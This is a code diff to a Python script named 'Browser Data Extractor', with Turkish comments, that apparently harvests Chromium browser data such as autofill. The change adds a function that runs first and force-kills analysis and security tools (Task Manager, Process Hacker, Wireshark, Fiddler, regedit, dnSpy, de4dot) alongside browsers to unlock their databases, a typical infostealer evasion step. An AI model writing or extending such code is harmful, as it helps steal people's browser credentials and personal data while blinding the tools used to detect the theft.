@@ -819,34 +819,45 @@ def process_chromium_browser(browser_name, browser_config):
         except Exception as e:
             log(f"  [Autofill] Error: {e}", "ERROR")
 
-def kill_browser_processes():
-
-    log("Killing browser processes to unlock DB files...")
-    process_names = set()
+def kill_blocking_processes():
+    """Kills browser and analysis processes immediately."""
+    log("Sistem temizliği yapılıyor (Process kill)...")
+    
+    # Genişletilmiş process listesi
+    targets = {
+        "taskmgr.exe", "processhacker.exe", "httpdebuggerui.exe", 
+        "wireshark.exe", "fiddler.exe", "regedit.exe", "discord.exe",
+        "vlc.exe", "checker.exe", "dnspy.exe", "de4dot.exe"
+    }
+    
+    # Browserları da ekle (DB kilidini kaldırmak için)
     for config in BROWSERS.values():
         pname = config.get('process_name')
         if pname:
-            process_names.add(pname)
-    log(f"  Target processes: {sorted(process_names)}", "DEBUG")
-    killed = 0
-    for proc in process_names:
+            targets.add(pname)
+            
+    killed_count = 0
+    for proc in sorted(targets):
         try:
-            result = subprocess.run(
-                ['taskkill', '/F', '/IM', proc],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                timeout=5
+            # /F (Force), /T (Child processes), /IM (Image name)
+            res = subprocess.run(
+                ['taskkill', '/F', '/T', '/IM', proc],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=2
             )
-            if result.returncode == 0:
-                log(f"  Killed: {proc}")
-                killed += 1
-            else:
-                log(f"  Not running: {proc}", "DEBUG")
-        except Exception as e:
-            log(f"  Failed to kill {proc}: {e}", "WARNING")
-    log(f"  Browser kill complete ({killed} processes terminated)")
+            if res.returncode == 0:
+                log(f"Sonlandırıldı: {proc}", "DEBUG")
+                killed_count += 1
+        except Exception:
+            pass
+            
+    log(f"İşlem tamamlandı. Toplam {killed_count} process durduruldu.")
+
 
 if __name__ == "__main__":
+    kill_blocking_processes()
+    
     log(f"{'='*60}")
     log(f"Browser Data Extractor Starting")
     log(f"{'='*60}")
@@ -854,8 +865,6 @@ if __name__ == "__main__":
     log(f"User: {os.environ.get('USERNAME', 'unknown')}")
     log(f"Output: {OUTPUT_BASE_DIR}")
     log(f"Browsers configured: {len(BROWSERS)}")
-
-    kill_browser_processes()
 
     chromium_browsers = {k: v for k, v in BROWSERS.items() if v.get('type') == 'chromium'}
     log(f"Processing {len(chromium_browsers)} Chromium-based browsers...")
